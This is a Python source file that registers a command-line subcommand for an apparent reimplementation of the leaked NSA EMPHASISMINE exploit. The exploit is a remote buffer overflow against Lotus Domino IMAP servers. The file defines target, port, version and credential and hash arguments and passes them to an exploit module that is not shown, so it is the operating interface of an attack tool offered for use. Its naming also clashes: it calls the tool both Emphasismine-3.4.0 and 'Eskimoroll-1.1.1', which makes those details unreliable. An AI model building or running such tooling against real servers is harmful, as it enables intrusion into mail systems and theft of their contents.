"""emphasis-mine — EMPHASISMINE Lotus Domino IMAP 远程利用。

Python 重写的 NSA Emphasismine 工具 `Emphasismine-3.4.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 Lotus Domino IMAP 利用流程。
"""

from . import emphasis_mine


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def emphasis_mine_handle(args):
    """Run the EMPHASISMINE exploitation sequence against the supplied host."""
    return emphasis_mine.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        domino_version=args.domino_version,
        target_acct_usr=args.target_acct_usr,
        target_acct_pwd=args.target_acct_pwd,
        credential_type=args.credential_type,
        username=args.username,
        credential=args.credential,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `emphasis-mine` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "emphasis-mine",
        help="EMPHASISMINE Lotus Domino IMAP 远程利用",
        description="Python 重写的 NSA Eskimoroll (EMPHASISMINE) Lotus "
                    "Domino IMAP 远程利用工具 Eskimoroll-1.1.1。针对 Lotus "
                    "Domino IMAP 服务器，执行缓冲区溢出利用。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=143,
        help="目标 IMAP 端口（默认 143）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--domino-version",
        choices=["6.5.4", "7.0.2"],
        default="7.0.2",
        help="目标 Lotus Domino 版本（默认 7.0.2）",
    )
    p.add_argument(
        "--target-acct-usr", metavar="USER",
        help="目标邮箱账户用户名",
    )
    p.add_argument(
        "--target-acct-pwd", metavar="PASS",
        help="目标邮箱账户密码",
    )
    p.add_argument(
        "--credential-type",
        choices=["UnicodeCreds", "PasswordHash", "MachineHash"],
        default="UnicodeCreds",
        help="凭证类型（默认 UnicodeCreds）",
    )
    p.add_argument(
        "--username", metavar="HEX",
        help="用户名（十六进制字节，Unicode）",
    )
    p.add_argument(
        "--credential", metavar="HEX",
        help="凭证/密码哈希（十六进制字节，Unicode）",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=emphasis_mine_handle)
